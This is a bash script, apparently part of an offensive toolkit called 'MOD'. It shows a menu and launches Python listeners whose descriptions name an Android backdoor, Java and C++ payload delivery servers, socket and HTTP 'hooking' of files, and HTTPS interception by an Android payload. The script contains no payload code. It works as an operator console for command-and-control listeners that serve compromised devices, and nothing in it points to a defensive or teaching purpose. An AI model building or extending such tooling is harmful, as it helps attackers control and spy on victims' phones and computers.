#!/bin/bash

# Listener Selector Script
# Directory containing listeners
LISTENER_DIR="/home/zeus/MOD/Listeners"

# Associative array of listeners and their descriptions
declare -A LISTENERS=(
    ["attack.py"]="Interpreter Executor - Runs custom interpreters for payload execution"
    ["hook.py"]="Socket Hooker - Hooks C files for socket communication"
    ["hotspot2.py"]="Android Backdoor - Manages Android app backdoor via hotspot"
    ["java-server.py"]="Java Payload Server - Handles Java-based payload delivery"
    ["remote_client.py"]="CPP Socket Client - Manages C++ clients using raw sockets"
    ["server.py"]="HTTP Hook Server - Hooks files using HTTP communication"
    ["server2.py"]="CPP HTTP Client - Manages C++ clients using HTTP protocol"
    ["sessions.py"]="HTTPS Interceptor - Android payload with HTTPS interception"
)

# Function to display listener menu
show_menu() {
    clear
    echo "=========================================="
    echo "      MOD Listener Selector v1.0         "
    echo "=========================================="
    echo "Available Listeners:"
    echo "------------------------------------------"
    
    # Display numbered list with descriptions
    i=1
    for listener in "${!LISTENERS[@]}"; do
        printf "%2d) %-15s - %s\n" "$i" "$listener" "${LISTENERS[$listener]}"
        ((i++))
    done
    
    echo "------------------------------------------"
    echo " 0) Exit"
    echo "=========================================="
    echo -n "Select a listener to run (0-$((${#LISTENERS[@]}))): "
}

# Function to run selected listener
run_listener() {
    local listener=$1
    echo -e "\n[+] Starting $listener..."
    echo "[+] Description: ${LISTENERS[$listener]}"
    echo "[+] Press Ctrl+C to stop the listener"
    echo "------------------------------------------"
    
    # Execute the listener
    python3 "$LISTENER_DIR/$listener"
}

# Main script execution
while true; do
    show_menu
    read -r choice
    
    # Validate input
    if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 0 && choice <= ${#LISTENERS[@]} )); then
        if (( choice == 0 )); then
            echo -e "\n[+] Exiting..."
            exit 0
        else
            # Get selected listener
            listener_array=("${!LISTENERS[@]}")
            selected_listener="${listener_array[$((choice-1))]}"
            
            # Run listener
            run_listener "$selected_listener"
            break
        fi
    else
        echo -e "\n[!] Invalid selection. Please enter a number between 0 and ${#LISTENERS[@]}"
        sleep 2
    fi
done
